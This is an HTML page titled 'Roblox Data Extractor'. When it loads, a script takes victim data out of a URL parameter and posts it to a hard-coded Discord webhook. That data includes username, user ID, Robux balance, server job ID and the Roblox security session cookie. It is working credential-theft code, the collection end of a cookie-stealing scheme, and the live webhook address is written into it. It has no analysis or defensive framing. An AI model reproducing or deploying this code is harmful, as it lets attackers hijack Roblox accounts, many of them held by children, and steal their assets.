<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Data Extractor</title>
    <script>
        function getQueryParam(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        function sendWebhook(message) {
            const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';
            
            const embed = {
                "embeds": [{
                    "title": "Roblox Data Extracted",
                    "fields": [
                        {
                            "name": "Username",
                            "value": message.username,
                            "inline": true
                        },
                        {
                            "name": "UserID",
                            "value": message.userid.toString(),
                            "inline": true
                        },
                        {
                            "name": "Robux",
                            "value": message.robux.toString(),
                            "inline": true
                        },
                        {
                            "name": "Job ID",
                            "value": message.job,
                            "inline": true
                        },
                        {
                            "name": "Teleport Info",
                            "value": message.teleport,
                            "inline": false
                        },
                        {
                            "name": "Roblox Security Cookie",
                            "value": message.robloxSecurity || "Not Available",
                            "inline": false
                        }
                    ],
                    "image": {
                        "url": message.headshot
                    },
                    "footer": {
                        "text": "Roblox Data Extractor"
                    }
                }]
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(embed)
            }).then(response => {
                if (response.ok) {
                    console.log('Webhook sent successfully');
                } else {
                    console.error('Error sending webhook:', response);
                }
            }).catch(error => {
                console.error('Request failed', error);
            });
        }

        function extractData() {
            const data = getQueryParam('data');
            if (data) {
                try {
                    const message = JSON.parse(decodeURIComponent(data));
                    sendWebhook(message); // Send the extracted data to the webhook
                } catch (error) {
                    console.error('Error parsing data:', error);
                    document.getElementById('output').innerText = 'Failed to parse data.';
                }
            } else {
                document.getElementById('output').innerText = 'No data found in URL.';
            }
        }

        function displayData(message) {
            const output = document.getElementById('output');
            output.innerHTML = `
                <h2>Extracted Data:</h2>
                <ul>
                    <li><strong>Username:</strong> ${message.username}</li>
                    <li><strong>UserID:</strong> ${message.userid}</li>
                    <li><strong>Headshot URL:</strong> <img src="${message.headshot}" alt="Headshot" width="100" height="100"></li>
                    <li><strong>Robux:</strong> ${message.robux}</li>
                    <li><strong>Job:</strong> ${message.job}</li>
                    <li><strong>Teleport Info:</strong> ${message.teleport}</li>
                    <li><strong>Roblox Security Cookie:</strong> ${message.robloxSecurity}</li>
                </ul>
            `;
        }
    </script>
</head>
<body onload="extractData()">
    <h1>Roblox Data Extractor</h1>
    <div id="output">Loading extracted data...</div>
</body>
</html>
